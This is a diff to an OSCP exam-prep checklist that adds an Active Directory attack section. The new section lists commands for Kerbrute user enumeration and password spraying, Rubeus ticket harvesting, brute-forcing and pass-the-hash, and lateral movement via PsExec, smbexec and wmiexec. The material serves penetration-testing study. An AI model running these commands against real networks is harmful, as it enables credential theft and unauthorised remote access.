@@ -1,4 +1,5 @@
 - [Network Sweep](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#network-sweep)
+- [AD]
 - [Enumerate Services](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#enumerate-services)
   - [Kerberos]
   - [SMB]
@@ -61,11 +62,35 @@ re-use on FTP/SSH/Web services.
 Especially SSH -
 You may already have a shell!
 
-# Enumerate Services
+# AD 
+[ADAttacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md)
 
-#### Kerberos 
+#### Kerbrute
 
 ```./kerbrute_linux_amd64 userenum -d $DOMAIN -dc $DOMAIN_CONTROLLER usernames.txt```
+
+```./kerbrute_linux_amd64 -domain $DOMAIN -users usernames.txt -passwords passwords.txt -outputfile Output_File```
+
+#### Rubeus
+
+```Rubeus.exe harvest /interval:30```
+
+```Rubeus.exe brute /password:$PASSWORD /noticket```
+
+```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
+
+
+
+#### Lat Move
+```PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd```
+
+```psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass```
+
+```smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass```
+
+```wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass```
+
+# Enumerate Services
 
 #### SMB
 ```enum4linux```
@@ -81,8 +106,6 @@ You may already have a shell!
 ```smbclient -L \\RALPH -N```
 
 ```smbclient //10.11.1.31/wwwroot```
-
-
 
 #### SNMP
 ```onesixtyone 10.11.1.13```
